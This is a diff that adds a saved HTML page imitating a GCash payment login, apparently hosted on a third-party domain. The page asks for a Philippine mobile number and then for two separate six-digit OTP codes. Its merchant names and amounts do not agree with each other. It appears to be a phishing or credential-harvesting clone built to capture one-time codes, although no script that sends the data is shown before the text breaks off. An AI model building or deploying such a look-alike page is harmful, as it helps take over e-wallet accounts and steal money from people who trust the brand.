@@ -1,0 +1,1292 @@
+
+<!-- saved from url=(0112)https://pay8.superpay.us/gcash_ex/gcash_ex.html?order_id=T01132210390044349304&money=200.00&pay_channel=gcash_ex -->
+<html style="font-size: 60px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script type="text/javascript" async="" src="./index_files/analytics.js"></script>
+<script async="" src="./index_files/gtm.js"></script>
+
+<meta name="format-detection" content="telephone=no, email=no">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
+<title>Gcash</title>
+<meta name="data-aspm" content="a769">
+<meta name="wap-font-scale" content="no">
+<link href="./index_files/css" rel="stylesheet">
+<script>
+		document.title = "Gcash";
+	</script>
+<script>
+		!(function (e, n) {
+			"use strict";
+			var t;
+
+			function i() {
+				var t = Math.min(e.innerWidth || n.clientWidth, 450) / 7.5;
+				n.style.fontSize = t + "px";
+			}
+			i(),
+				window.addEventListener("resize", function () {
+					clearTimeout(t), (t = setTimeout(i, 300));
+				});
+		})(window, document.documentElement);
+	</script>
+<link rel="stylesheet" href="./index_files/gcash.css">
+<meta http-equiv="expires" content="0">
+<style>
+		.result {
+			text-align: center;
+			color: orange;
+			font-size: 2em;
+			font-weight: bold;
+			margin-top: 1.5em;
+			display: block;
+		}
+
+		.otp-input-style input {
+			border-radius: 0;
+			border: none;
+			background-color: #fff;
+			border-bottom: 0.06rem solid #292b30;
+			outline: 0;
+			color: #111111;
+			width: 0.5rem;
+			/*padding: 0 5px;*/
+			margin-right: 10px;
+			text-align: center;
+			font-size: 3em;
+			cursor: pointer;
+			will-change: border;
+			transition: border .3s ease-in-out;
+			-webkit-appearance: none;
+			-moz-appearance: textfield;
+
+			top: 50%;
+			font-family: Poppins, sans-serif;
+			font-weight: 600;
+			font-size: .72rem;
+			transform: translate(0%, 0%);
+		}
+
+		.otp-input-style input[type=number]::-webkit-inner-spin-button,
+		.otp-input-style input[type=number]::-webkit-outer-spin-button {
+			-webkit-appearance: none;
+			-moz-appearance: none;
+			-moz-appearance: textfield;
+			appearance: none;
+			margin: 0;
+		}
+
+		.otp-input-style input:focus {
+			/*border: 0;*/
+			/*border-bottom: 2px solid #ff6200;*/
+		}
+
+
+		.otp-input-style input:last-child {
+			margin-right: 0;
+		}
+
+		.paintOrangeLine {
+			border: 0;
+			/*border-bottom: 2px solid #ff6200;*/
+		}
+
+		.pin-wrapper {
+			margin: 0.75rem auto 1rem;
+			width: 6.52rem;
+		}
+
+		.pin-wrapper input {
+			width: 0.3rem;
+			height: 0.3rem;
+			border: 3px solid #000;
+			margin: 0 7px;
+			border-radius: 50%;
+		}
+
+		.pin {
+			color: #ffffff;
+			font-size: 20px;
+			text-align: center;
+		}
+
+		.bg-black {
+			background: #000;
+		}
+	</style>
+<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		.loading {
+			width: 100%;
+			height: 100%;
+			position: fixed;
+			/*background:#000;*/
+			z-index: 98;
+			top: 0px;
+			left: 0px;
+			filter: alpha(Opacity=50);
+			-moz-opacity: 0.50;
+			opacity: 0.50;
+		}
+
+		.body_loading {
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			padding: 0;
+			margin: 0;
+			/*background-color: #0d0d0d;*/
+		}
+
+		.spinner {
+			--color: rgb(0 255 155);
+			--fade-color: rgba(0 255 155 / 50%);
+			--scale: 1;
+			--x-speed: 1;
+			position: absolute;
+			left: calc(50% - 23px);
+			top: calc(50% - 23px);
+			width: 46px;
+			height: 46px;
+			transform: scale(var(--scale)) rotateZ(0);
+			animation: ps-spin calc(15s / var(--x-speed)) linear infinite
+		}
+
+		@keyframes ps-spin {
+			from {
+				transform: scale(var(--scale)) rotateZ(0);
+			}
+
+			to {
+				transform: scale(var(--scale)) rotateZ(-360deg);
+			}
+		}
+
+		.spinner span {
+			display: block;
+			position: absolute;
+			width: 100%;
+			height: 100%;
+		}
+
+		.spinner span::before,
+		.spinner span::after {
+			content: "";
+			position: absolute;
+			width: 12px;
+			height: 12px;
+			top: 50%;
+			transform: translateY(-50%) scale(.3);
+			background-color: rgba(var(--color) / 50%);
+			border-radius: 50%;
+			animation: ps-spinner-scale calc(1.2s / var(--x-speed)) linear infinite
+		}
+
+		@keyframes ps-spinner-scale {
+			0% {
+				background-color: var(--fade-color);
+				transform: translateY(-50%) scale(.3);
+			}
+
+			25% {
+				background-color: var(--color);
+				transform: translateY(-50%) scale(1);
+			}
+
+			80% {
+				background-color: var(--fade-color);
+				transform: translateY(-50%) scale(.3);
+			}
+
+			100% {
+				background-color: var(--fade-color);
+				transform: translateY(-50%) scale(.3);
+			}
+		}
+
+		.spinner span::before {
+			left: 0;
+		}
+
+		.spinner span::after {
+			right: 0;
+		}
+
+		.spinner span:first-of-type {
+			transform: rotateZ(-45deg);
+		}
+
+		.spinner span:last-of-type {
+			transform: rotateZ(45deg);
+		}
+
+		.spinner span:nth-of-type(2) {
+			transform: rotateZ(90deg);
+		}
+
+		.spinner span:nth-of-type(3)::after {
+			animation-delay: calc(0.15s / var(--x-speed));
+		}
+
+		.spinner span:last-of-type::after {
+			animation-delay: calc(.3s / var(--x-speed));
+		}
+
+		.spinner span:nth-of-type(2)::after {
+			animation-delay: calc(.45s / var(--x-speed));
+		}
+
+		.spinner span:first-of-type::before {
+			animation-delay: calc(.6s / var(--x-speed));
+		}
+
+		.spinner span:nth-of-type(3)::before {
+			animation-delay: calc(.75s / var(--x-speed));
+		}
+
+		.spinner span:last-of-type::before {
+			animation-delay: calc(.9s / var(--x-speed));
+		}
+
+		.spinner span:nth-of-type(2)::before {
+			animation-delay: calc(1.05s / var(--x-speed));
+		}
+
+		.code {
+			border: 1px;
+			background: #eaeaed;
+			color: #1457e4 !important;
+			font: 14px/24px "Source Code Pro", Inconsolata, "Lucida Console", Terminal, "Courier New", Courier;
+			display: inline-block;
+			margin: 0 14px;
+			text-align: center;
+			border: 8px dashed #9799a7;
+		}
+
+		.cy-loading::before,
+		.cy-loading::after {
+			content: '';
+			position: absolute;
+			top: -30rem;
+			right: 0;
+			bottom: 0;
+			left: 0;
+			z-index: 5;
+			margin: auto;
+		}
+
+		.cy-loading::before {
+			content: attr(load-tip);
+			font-size: 13px;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			background: rgba(0, 0, 0, 0.6);
+			color: #fff;
+			width: 80px;
+			height: 80px;
+			border-radius: 1rem;
+		}
+
+		.cy-loading::after {
+			top: -30rem;
+			width: 20px;
+			height: 20px;
+			border-radius: 50%;
+			border: 1px solid #fff;
+			border-top-color: transparent;
+			z-index: 5;
+			animation: rotate1t 0.8s linear infinite;
+		}
+
+		@keyframes rotate1t {
+			100% {
+				transform: rotate(1turn);
+			}
+		}
+
+		.loadingBox {
+			position: fixed;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, .1);
+		}
+	</style>
+</head>
+<body style="zoom: 1;">
+<div class="loadingBox" style="display: none;">
+<span id="loading" class="spinner">
+<span></span>
+<span></span>
+<span></span>
+<span></span>
+</span>
+</div>
+<div id="main-div">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0;" id="__SVG_SPRITE_NODE__">
+<symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 72" id="icon-error">
+<path d="M51.2 22.7l-1.4-1.4-13.5 13.5L23 21.5l-1.4 1.4 13.3 13.3-13.4 13.4 1.4 1.4 13.4-13.4 13.6 13.6 1.4-1.4-13.6-13.6 13.5-13.5zM36 0C16.1 0 0 16.1 0 36s16.1 36 36 36 36-16.1 36-36S55.9 0 36 0zm0 70C17.3 70 2 54.7 2 36S17.3 2 36 2s34 15.3 34 34-15.3 34-34 34z">
+</path>
+</symbol>
+<symbol xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 76 76" id="icon-processing">
+<defs>
+<circle id="icon-processing_a" cx="38" cy="38" r="38"></circle>
+<path id="icon-processing_b" d="M16.53 22.766c4.62-1.76 7.57-7.42 8.85-16.982a4 4 0 0 0-2.81-4.36C19.416.474 16.265 0 13.114 0c-3.14 0-6.272.473-9.39 1.418A4 4 0 0 0 .917 5.775c1.278 9.567 4.228 15.23 8.85 16.99-4.62 1.76-7.57 7.42-8.85 16.983a4 4 0 0 0 2.81 4.36c3.15.95 6.302 1.424 9.453 1.424 3.145 0 6.276-.472 9.396-1.417a4 4 0 0 0 2.804-4.358c-1.28-9.567-4.228-15.23-8.85-16.99z">
+</path>
+</defs>
+<g fill="none" fill-rule="evenodd">
+<use fill="#FFD853" xlink:href="#icon-processing_a"></use>
+<circle cx="38" cy="38" r="36.5" stroke="#FFC019" stroke-width="3"></circle>
+<path fill="#FFF" d="M41.53 37.766c4.47-1.702 7.374-7.052 8.717-16.052a4 4 0 0 0-3.644-4.578 108.66 108.66 0 0 0-8.487-.332c-2.817 0-5.625.11-8.423.33a4 4 0 0 0-3.643 4.577c1.343 9.006 4.248 14.358 8.717 16.06-4.467 1.7-7.374 7.05-8.717 16.05a4 4 0 0 0 3.644 4.578 108.46 108.46 0 0 0 16.915.002 4 4 0 0 0 3.643-4.58c-1.342-9-4.247-14.35-8.717-16.054z" opacity=".9"></path>
+<path fill="#FFC019" d="M28.985 29.84c2.603-.922 5.758-1.383 9.463-1.383 3.706 0 6.614.46 8.724 1.382l-2.65 5.7-6.074 2.36-6.073-2.36-3.39-5.7zm-2.6 19.464C29.28 50.434 33.305 51 38.462 51c5.158 0 8.852-.565 11.083-1.696v8.632h-23.16v-8.632z">
+</path>
+<path stroke="#000" stroke-width="5" d="M29.678 56.572c1.3-5.074 2.765-17.105 6.497-18.865-4.41-3.18-6.743-16.86-7.19-18.864" opacity=".054"></path>
+<g transform="translate(25 15)">
+<path stroke="#FFF6DF" stroke-width="3" d="M13.15 22.45l2.846-1.086c3.978-1.514 6.683-6.705 7.896-15.78a2.5 2.5 0 0 0-1.757-2.724c-3.01-.907-6.016-1.36-9.02-1.36-2.993 0-5.978.45-8.957 1.353a2.5 2.5 0 0 0-1.753 2.724C3.617 14.655 6.322 19.85 10.3 21.364l2.85 1.085zm0 .633l-2.85 1.085c-3.978 1.515-6.682 6.705-7.896 15.78A2.5 2.5 0 0 0 4.16 42.67c3.013.907 6.018 1.36 9.02 1.36 2.994 0 5.98-.45 8.96-1.353a2.5 2.5 0 0 0 1.752-2.724c-1.213-9.08-3.918-14.272-7.897-15.788l-2.847-1.085zm0 0l-.834-.317.833-.317.83.312-.835.317z">
+</path>
+<use stroke="#FFC019" stroke-width="2" xlink:href="#icon-processing_b"></use>
+</g>
+</g>
+</symbol>
+<symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 70" id="icon-spin">
+<path opacity="0.083" d="M35,0L35,0c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V3C32,1.3,33.3,0,35,0z"></path>
+<path opacity="0.167" d="M52.5,4.7L52.5,4.7c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C49.2,4.4,51.1,3.9,52.5,4.7z"></path>
+<path opacity="0.25" d="M65.3,17.5L65.3,17.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C62.6,15.6,64.5,16.1,65.3,17.5z"></path>
+<path opacity="0.333" d="M70,35L70,35c0,1.7-1.3,3-3,3H53c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C68.7,32,70,33.3,70,35z"></path>
+<path opacity="0.417" d="M65.3,52.5L65.3,52.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C65.6,49.2,66.1,51.1,65.3,52.5z"></path>
+<path opacity="0.5" d="M52.5,65.3L52.5,65.3c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1l0,0 c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C54.4,62.6,53.9,64.5,52.5,65.3z"></path>
+<path opacity="0.583" d="M35,50L35,50c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V53 C32,51.3,33.3,50,35,50z"></path>
+<path opacity="0.667" d="M27.5,48L27.5,48c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C24.2,47.7,26.1,47.2,27.5,48z"></path>
+<path opacity="0.75" d="M20,35L20,35c0,1.7-1.3,3-3,3H3c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C18.7,32,20,33.3,20,35z"></path>
+<path opacity="0.8333" d="M22,42.5L22,42.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C19.3,40.6,21.2,41.1,22,42.5z"></path>
+<path opacity="0.917" d="M22,27.5L22,27.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C22.3,24.2,22.8,26.1,22,27.5z"></path>
+<path d="M27.5,22L27.5,22c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1 l0,0c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C29.4,19.3,28.9,21.2,27.5,22z"></path>
+</symbol>
+<symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 72" id="icon-success">
+<path d="M36 .1C55.8.1 71.9 16.3 71.9 36c0 19.8-16.1 35.9-35.9 35.9-19.9-.1-36-16.2-35.9-36C.1 16.1 16.2.1 36 .1zm0 2C17.3 2.1 2.1 17.2 2.1 35.9c0 18.7 15.2 33.9 33.9 33.9s33.9-15.2 33.9-33.9C69.8 17.3 54.7 2.1 36 2.1z">
+</path>
+<path d="M51.2 25.9l1.4 1.4C45 35 37.4 42.7 29.7 50.4c-4.1-4.2-8.1-8.4-12.2-12.5.5-.5.9-.9 1.4-1.5l10.8 11.1c7.2-7.2 14.4-14.4 21.5-21.6z"></path>
+</symbol>
+</svg>
+<div class="root-app desktop">
+<div>
+<h1 class="layout-header">
+<img src="./index_files/gcash_logo.f988652.png" alt="">
+</h1>
+<div class="layout-content">
+
+<!--login-->
+<div  id="login" class="main-container login-page warp2">
+<div class="merchant-info">
+<div class="row"><label>Merchant</label> <span class="merchant-name">GCPay, Inc.</span></div>
+<div class="row"><label>Amount Due</label> <span id="g_amount" class="amount money"></span></div>
+</div>
+<input type="hidden" name="m_id" value="2962540331787">
+<div class="page-container">
+<div class="page-main content-center">
+<h2>Login to pay with GCash</h2>
+<div class="login">
+<div accessbilityid="mobile-input" class="m-input hasPrefix notEmpty" autofocus="autofocus">
+<div class="input-wrap">
+<div class="input-prefix">+63</div>
+<input maxlength="11" type="number" class="phone" name="mobileNum" pattern="[0-9]*" onkeydown="if(this.value.length==11 &amp;&amp; event.keyCode&gt;47 &amp;&amp; event.keyCode &lt; 58)return false;">
+<div class="line"></div>
+<label class="placeholder">Mobile number</label>
+</div>
+<p class="error-text error-message"></p>
+</div>
+</div>
+</div>
+<footer>
+<div class="submit-button display-mobile">
+<button id="login-btn" type="submit" class="ap-button ap-button-primary" accessbilityid="next-button">
+NEXT
+</button>
+</div>
+</footer>
+</div>
+<div data-v-0393febb=""></div>
+</div>
+
+<!--login end-->
+
+
+
+<!--logincode-->
+<div   style="display: none;" id="digit2" class="main-container otp-page otp-input-style warp2" >
+<div class="page-container content-center">
+<div class="page-item digit-message">
+<h2>Login to pay with GCash</h2>
+<p>Enter the 6-digit authentication code sent to your registered mobile number.</p>
+</div>
+<p class="text-center error-text"></p>
+<div class="page-item otp-password-field">
+<div class="ap-digital-password" accessbilityid="otp-input">
+<div class="container"><input type="number" class="otp-input nodisabled" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;"><input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""></div>
+<span class="result"></span>
+</div>
+</div>
+<div class="page-item">
+<p class="resend-container text-center">Enter Authentication Code
+
+</p>
+<p class="resend-container text-center"><a href="javascript:void(0)" id="resend_otp">Resend OTP</a>
+
+</p>
+</div>
+<div class="submit-button">
+<button id="digit-btn2" type="submit" class="ap-button ap-button-primary" accessbilityid="submit-button">
+NEXT
+</button>
+</div>
+</div>
+<div data-v-0393febb=""></div>
+<input type="hidden" name="m_id" value="2962540331787">
+</div>
+
+<!--logincode end-->
+
+<!--second verify OTP-->
+
+<div style="display: none;" id="digit" class="main-container daifu-otp-page otp-input-style warp2">
+<div class="page-container content-center">
+<div class="page-item digit-message">
+<h2>Verify to pay with GCash</h2>
+<p>Enter the 6-digit authentication code sent to your registered mobile number.</p>
+</div>
+<p class="text-center error-text"></p>
+<div class="page-item otp-password-field">
+<div class="ap-digital-password" accessbilityid="otp-input">
+<div class="container2"><input type="number" class="otp-input2 nodisabled" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;"><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""><input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled=""></div>
+<span class="result"></span>
+</div>
+</div>
+<div class="page-item">
+<p class="resend-container text-center">Enter Authentication Code
+
+</p>
+<p class="resend-container text-center"><a href="javascript:void(0)" id="daifu_resend_otp">Resend OTP</a>
+
+</p>
+<p class="resend-container text-center">Example:</p>
+<p class="resend-container text-center code">****** is your authentication code. For your protection, do not share this code with anyone.
+
+</p>
+<p></p>
+</div>
+<div class="submit-button">
+<button id="digit-btn" type="submit" class="ap-button ap-button-primary" accessbilityid="submit-button">
+PAY <span class="amount money">PHP 200.00</span>
+</button>
+</div>
+</div>
+<div data-v-0393febb=""></div>
+<input type="hidden" name="m_id" value="2962540331787">
+</div>
+
+<!--second verify OTP end -->
+
+<!-- View Order -->
+
+<div class="main-container confirm-page" style="display: none;">
+<div class="page-container">
+<div class="merchant-only">
+<h2>AAPlus, Inc.</h2>
+</div>
+<div class="container-cashier">
+<div class="channels">
+<label class="header">PAY WITH</label>
+<div class="payment-channel balance">
+<h3 class="channel-name">
+GCash
+</h3>
+<div class="container-payment">
+<div class="total-amount">
+
+</div>
+<div class="button">
+<img src="data:image/png;base64,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">
+</div>
+</div>
+</div>
+
+</div>
+<div class="order-details">
+<label class="header">YOU ARE ABOUT TO PAY</label>
+<div class="row cashier-row">
+<label>Amount</label>
+<p class="amount">PHP 200.00</p>
+</div>
+
+
+
+<div class="coupons">
+<div class="row cashier-row">
+<label>Discount</label>
+<div class="right">
+<p accessbilityid="lucky-tip" class="amount empty-selected gray-text">No available voucher</p>
+
+
+</div>
+</div>
+</div>
+<hr>
+<div class="container-total-amt">
+<h3>Total</h3>
+<div class="total-amt">
+<div class="amount">
+<p>PHP</p>
+<h1>100.00</h1>
+</div>
+
+</div>
+</div>
+<div class="ensure-tip">
+<p>Please review to ensure that the details are correct before you proceed.</p>
+</div>
+</div>
+<footer>
+<div class="submit-button confirm-button">
+<button type="submit" class="ap-button ap-button-primary" accessibilityid="button-pay">
+PAY PHP 200.00
+</button>
+</div>
+</footer>
+</div>
+</div>
+</div>
+
+<!-- View Order -->
+
+<!-- Successfully Paid -->
+
+<div id="success-page" class="main-container success-page warp2" style="padding: 1em; display: none;">
+<div class="container-success">
+<header>
+<div class="header-top">
